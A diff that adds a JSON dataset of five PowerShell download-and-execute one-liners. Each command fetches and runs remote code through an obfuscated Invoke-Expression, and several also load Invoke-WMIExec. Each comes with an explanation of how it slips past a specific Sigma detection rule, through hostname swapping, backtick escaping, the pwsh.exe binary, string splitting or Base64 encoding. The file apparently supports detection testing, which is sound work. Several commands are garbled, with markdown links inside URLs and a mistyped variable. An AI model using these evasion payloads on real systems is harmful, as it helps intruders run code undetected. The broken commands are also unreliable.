@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command bypasses the rule by substituting the explicit IP address '[http://127.0.0.1](http://127.0.0.1)' with 'http://localhost'. Since the Sigma rule relies on a 'contains|all' condition that specifically requires the exact string '[http://127.0.0.1](http://127.0.0.1)', changing the hostname representation successfully evades detection while keeping the functionality intact."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('[http://127.0.0.1:1337/](http://127.0.0.1:1337/)' | ForEach-Object { Invoke-RestMethod $* });&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\EXAMPLE\\I`nvoke-WMIExec.ps1; I`nvoke-WMIExec\"",
+    "explanation": "This command evades the rule by breaking two of the required string matches. First, it replaces the shorthand alias '%{(IRM $*)}' with its fully expanded cmdlet form 'ForEach-Object { Invoke-RestMethod $* }'. Second, it uses a PowerShell escape character (backtick) in the word 'I`nvoke' to prevent the exact string match for 'Invoke'."
+  },
+  {
+    "output": "pwsh.exe -nop -noni -ep bypass -w h -c \"$u=('[http://127.0.0.1:1337/](http://127.0.0.1:1337/)'|%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command bypasses the rule by executing via PowerShell Core ('pwsh.exe') instead of Windows PowerShell ('powershell.exe'). The Sigma rule specifically targets 'Image|endswith: \\powershell.exe', making it blind to equivalent commands executed through the modern pwsh binary."
+  },
+  {
+    "output": "powershell.exe -NoP -C \"$s='ht'; $s+='tp://127.0.0.1:1337'; $m=Invoke-RestMethod -Uri $s; $m | ForEach-Object { $_ }; &('I'+'EX')($m); Import-Module C:\\Users\\Public\\Tools.ps1\"",
+    "explanation": "The original rule triggers on three specific strings occurring simultaneously: the literal IP '127.0.0.1', the specific alias shorthand '%{(IRM $_)}', and the string 'Invoke'. This bypass breaks the IP string into variables, uses the full 'ForEach-Object' name instead of the '%' alias, and uses 'Invoke-RestMethod' instead of the 'IRM' alias, satisfying the functional requirements of the one-liner while avoiding the exact string matches."
+  },
+  {
+    "output": "powershell.exe -e JAB1AD0AKAAiAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADMAMwA3AC8AIgApADsAJABtAD0AaQByAG0AIAAkAHUAOwAkAG0AIAB8ACAAJQB7ACQAXwB9ADsAaQBlAHgAKAAkAG0AKQA7AEkAbQBwAG8AcgB0AC0ATQBvAGQAdQBsAGUAIABDAA6AFwAVABlAG0AcABcAEkAbgB2AG8AawBlAC0AVwBNAEkARQB4AGUAAGMALgBwAHMAMQA=",
+    "explanation": "The rule targets 'process_creation' logs which often capture the command line. By using Base64 encoding (-EncodedCommand or -e), the literal strings '127.0.0.1', '%{(IRM $_)}', and 'Invoke' are not visible in the plaintext command line, effectively bypassing string-based detection filters that do not perform automatic decoding."
+  }
+]
